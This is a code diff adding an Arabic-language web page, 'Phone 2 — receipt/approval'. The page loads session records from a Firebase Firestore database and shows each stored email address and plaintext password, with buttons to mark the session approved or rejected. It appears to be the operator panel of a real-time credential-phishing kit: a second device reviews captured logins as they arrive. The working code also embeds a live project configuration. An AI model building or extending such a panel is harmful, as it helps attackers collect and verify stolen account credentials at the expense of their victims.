@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>جوال 2 — عرض والموافقة</title>
+  <style>
+    body{font-family:Arial,system-ui;background:#0b1020;color:#e9edff;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}
+    .card{background:#121832;border:1px solid #263164;border-radius:16px;padding:22px;width:min(92%,560px);box-shadow:0 10px 40px rgba(0,0,0,.35)}
+    input{width:100%;padding:12px;margin:6px 0 12px;border-radius:10px;border:1px solid #263164;background:#0e1636;color:#e9edff;outline:none}
+    button{padding:12px 14px;border:0;border-radius:10px;background:#3a69ff;color:#fff;font-weight:800;cursor:pointer}
+    .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+    .mono{font-family:ui-monospace,Consolas,monospace}
+    .box{padding:10px;border:1px dashed #263164;border-radius:10px;margin-top:8px;word-break:break-all}
+    .ok{background:#1f9d55} .bad{background:#e83d3d}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>جوال 2 — الاستلام</h2>
+    <div class="row">
+      <input id="sid" placeholder="حطّ id أو افتح بالرابط" />
+      <button id="load">فتح</button>
+    </div>
+    <div id="view" class="box" style="display:none">
+      <div>الإيميل: <span id="email" class="mono"></span></div>
+      <div>كلمة المرور: <span id="password" class="mono"></span></div>
+      <div class="row" style="margin-top:10px">
+        <button id="approve" class="ok">موافقة</button>
+        <button id="reject" class="bad">رفض</button>
+      </div>
+    </div>
+  </div>
+
+  <script type="module">
+    const firebaseConfig = {"apiKey": "AIzaSyDInDvI0xrWCmvfKN6QQQpB5YiESeJS_Jc", "authDomain": "iugfgg.firebaseapp.com", "projectId": "iugfgg", "storageBucket": "iugfgg.firebasestorage.app", "messagingSenderId": "595497115275", "appId": "1:595497115275:web:7f019d07b5ea61e2677e8e", "measurementId": "G-JR5KEPMHPR"};
+
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const $ = s => document.querySelector(s);
+
+    function getIdFromUrl(){ try{ return new URL(location.href).searchParams.get('id'); }catch{ return ''; } }
+
+    async function load(){
+      const id = (document.getElementById("sid").value || getIdFromUrl() || '').trim();
+      if(!id){ alert("أدخل id أو افتح الرابط الذي وصلك"); return; }
+      const ref = doc(db, 'sessions', id);
+      const snap = await getDoc(ref);
+      if(!snap.exists()){ alert('ما لقيت الجلسة'); return; }
+      const data = snap.data();
+      document.getElementById("email").textContent = data.email || '';
+      document.getElementById("password").textContent = data.password || '';
+      document.getElementById("view").style.display = 'block';
+
+      document.getElementById("approve").onclick = ()=> updateDoc(ref, { status: 'approved' });
+      document.getElementById("reject").onclick  = ()=> updateDoc(ref, { status: 'rejected'  });
+    }
+
+    document.getElementById("load").addEventListener('click', load);
+    window.addEventListener('load', ()=>{ const q = getIdFromUrl(); if(q){ document.getElementById("sid").value=q; load(); } });
+  </script>
+</body>
+</html>
